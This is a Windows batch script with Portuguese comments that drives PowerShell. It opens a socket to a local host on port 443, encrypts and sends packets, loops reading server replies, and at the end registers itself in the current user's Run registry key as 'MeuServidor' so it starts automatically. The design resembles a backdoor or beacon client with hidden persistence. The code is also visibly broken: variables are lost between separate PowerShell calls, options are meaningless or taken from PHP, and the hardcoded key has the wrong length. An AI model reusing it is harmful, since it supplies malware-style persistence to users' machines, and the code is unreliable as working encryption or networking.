@echo off
set "host=127.0.0.1"
set "port=443"
set "timeout=10"

:: Configuração para criptografia segura (TLS)
set "contextOptions=--ssl-certificates-verify peer --ssl-certificates-verify peer-name --ssl-method TLSv1_2"
set "context=%contextOptions%"

:: Criando um socket seguro com TLS
%comspec% /C "powershell -Command \"$socket = [System.Net.Sockets.TcpClient]::new('$host', $port); $stream = $socket.GetStream(); $stream.ReadTimeout = $timeout * 1000; if ($null -eq $stream) { exit 1 } else {\" > nul"

if errorlevel 1 (
    exit /b 1
) else (
    :: Configurações de criptografia AES-GCM
    set "chave=sua-chave-secreta-de-32-bytes12345678"
    set "ivTamanho=%openssl_cipher_iv_length%"

    :: Função para dividir, criptografar e enviar pacotes
    :enviarPacoteCriptografado
    for /F "delims=" %%P in ('powershell -Command "& { $mensagem = '.'; $tamanhoPacote = 512; $pacotes = 0..( $mensagem.length / $tamanhoPacote - 1); foreach ($pacote in $pacotes) { $iv = [System.Security.Cryptography.RNGCryptoServiceProvider]::new().GetBytes($ivTamanho); $pacoteComNonce = $pacote + '|' + $mensagem.Substring($pacote * $tamanhoPacote, $tamanhoPacote); $pacoteCriptografado = [System.IO.MemoryStream]::new(); $tag = [System.Byte[]]::new(16); $encryption = [System.Security.Cryptography.AesGcm]::new($chave); $encryption.Encrypt($iv, [System.Text.Encoding]::UTF8.GetBytes($pacoteComNonce), $tag, $pacoteCriptografado); [Convert]::ToBase64String([System.IO.MemoryStream]::new().ToArray()) } }')" (
        :: Envia o pacote criptografado
        echo %%%P | powershell -Command "& { $stream.Write([Convert]::FromBase64String('%%%P'), 0, [Convert]::FromBase64String('%%%P').Length); }"
    )

    :: Manter a comunicação aberta e ler resposta do servidor enquanto estiver ativo
    :whileActive
    powershell -Command "& { while ($true) { $resposta = $stream.ReadLine(); if ($resposta -eq $null) { break } } sleep 0.1 }"

    :: Fechar a conexão
    powershell -Command "& { $stream.Close(); $socket.Close(); }"

    :: Adicionar à inicialização do Windows
    powershell -Command "& { $appPath = $env:~0; [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\Microsoft\\Windows\\CurrentVersion\\Run', $true).SetValue('MeuServidor', $appPath); }"
)
